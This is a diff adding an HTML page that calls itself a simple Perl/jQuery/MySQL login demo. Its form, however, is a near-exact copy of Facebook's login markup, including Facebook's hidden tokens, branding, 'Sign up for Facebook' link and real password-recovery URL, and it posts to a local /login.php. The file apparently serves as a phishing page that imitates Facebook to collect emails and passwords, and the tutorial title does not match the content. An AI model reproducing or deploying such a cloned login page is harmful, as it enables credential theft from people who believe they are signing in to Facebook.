@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Very simple login using Perl, jQuery, Ajax, JSON and MySQL</title>
+    <link rel="stylesheet" type="text/css" media="screen, projection" 
+      href="http://www.blueprintcss.org/blueprint/screen.css" />
+    <link rel="stylesheet"  type="text/css" media="screen, projection"
+      href="http://www.blueprintcss.org/blueprint/plugins/buttons/screen.css" />
+    <link rel="stylesheet" type="text/css" media="print" 
+      href="http://www.blueprintcss.org/blueprint/print.css" />
+    <!--[if IE]><link rel="stylesheet" type="text/css" media="screen, projection" 
+      href="http://www.blueprintcss.org/blueprint/ie.css"><![endif]-->
+    <script type="text/javascript" 
+      src="http://code.jquery.com/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript" src="login.js"></script>
+    <style type="text/css">
+      #loginContent { width: 350px; margin: 100px auto; }
+      button[type] { margin: 0.5em 0; }
+    </style>
+  </head>
+  <body>
+    <div id="loginContent" class="container">
+      <div id="loginResult" style="display:none;">
+      </div>
+ <form id="login_form" action="/login.php?login_attempt=1" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input type="hidden" name="lsd" value="AVq4-UOe" autocomplete="off" /><div class="hidden_elem"></div><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" /><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="183024_w5or" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="email" value="" tabindex="1" /></div><div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="pass" id="pass" class="inputpassword" tabindex="1" /></div><div class="persistent"><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox" /><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="login" tabindex="1" type="submit" id="u_0_1" /></label></div><div id="register_link">or <strong><a href="/r.php?next&amp;locale=en_US&amp;display=page" rel="nofollow">Sign up for Facebook</a></strong></div></div><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="">Forgot your password?</a></p></div></form>
+    </div>
+  </body>
+</html>
